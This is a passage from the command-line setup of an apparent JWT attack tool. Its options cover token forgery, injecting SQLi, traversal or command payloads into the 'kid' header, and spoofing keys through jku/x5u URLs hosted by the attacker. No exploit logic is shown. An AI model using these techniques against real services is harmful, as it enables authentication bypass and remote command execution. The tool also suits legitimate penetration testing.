                        metavar="<hours>", required=False
                        )
    parser.add_argument("-T", "--add-time",
                        help="Hours to add to time claims if any ('iat', 'exp', 'nbf'). From 1 to 24",
                        metavar="<hours>", required=False
                        )
    parser.add_argument("-V", "--verify-token-with",
                        help="The key to verify the token with. Verify and exit",
                        metavar="<keyfile>", required=False
                        )
    parser.add_argument("--complex-payload", action="append", nargs="+",
                        help="As --payload but for subclaims. Keys must be comma separated, and passed in cronological order. If value have to be a list, pass the list items as comma separated values",
                        metavar="<key,key...>:<value>", required=False
                        )
    parser.add_argument("--remove-from", action="append", nargs="+",
                        help="The section of the token and the key of the item to delete, as key:value pairs",
                        metavar="<section>:<key>", required=False,
                        )
    parser.add_argument("--add-into", action="append", nargs="+",
                        help="The section of the token and the key of the item to add as key:value pairs",
                        metavar="<section>:<key>", required=False
                        )
    parser.add_argument("--unverified", action="store_true",
                        help="Server does not verify the signature",
                        required=False
                        )
    parser.add_argument("--auto-try",
                        help="The target domain. Retrieve public key from the target ssl cert",
                        metavar="<domain>", required=False
                        )
    parser.add_argument("--inject-kid",
                        help="The payload to inject in the kid header (SQLi, DirTrv, RCE)",
                        metavar="<payload>", required=False
                        )
    parser.add_argument("--exec-via-kid",
                        help="A system command to be injected in the kid (if default RCE does not work)",
                        metavar="<command>", required=False
                        )
    parser.add_argument("--specify-key",
                        help="A string to be used as password for sign the token", metavar="<key>",
                        required=False
                        )
    parser.add_argument("--jku-basic",
                        help="The ip/domain where you will host the jwks file. '/.well-known/jwks.json' is automatically appended",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--jku-redirect",
                        help="The url vulnerable to Open Redirect and your one, as comma separated values. Replace the redirect url with the HERE keyword. './well-known/jwks.json' is automatically appended to your url",
                        metavar="<mainURL,yourURL>", required=False
                        )
    parser.add_argument("--jku-inbody",
                        help="The url vulnerable to HTTP header injection. Append the HERE keyword to the vulnerable parameter of the url query string",
                        metavar="<mainURL>", required=False
                        )
    parser.add_argument("--x5u-basic",
                        help="The ip/domain where you will host the jwks.json file. '/.well-known/jwks.json' is automatically appended",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--x5u-inbody",
                        help="The url vulnerable to HTTP header injection. Append the HERE keyword to the vulnerable parameter of the url query string",
                        metavar="<mainURL>", required=False
                        )
    parser.add_argument("--manual", action="store_true",
                        help="Tool won't append '/.well-known/jwks.json' to your url. Use this flag only with --jku-basic and --x5u-basic",
                        required=False
                        )
    parser.add_argument("--generate-jwk", action="store_true",
                        help="Generate a jwk claim and insert it in the token header",
                        required=False
                        )

    # Parse arguments
    args = parser.parse_args()

    cracker = Cracker(
        args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
        args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
        args.verify_token_with, args.subtract_time, args.add_time, args.unverified, args.blank, args.decode, args.manual, args.generate_jwk,
    )

    # Start the cracker
    cracker.run()
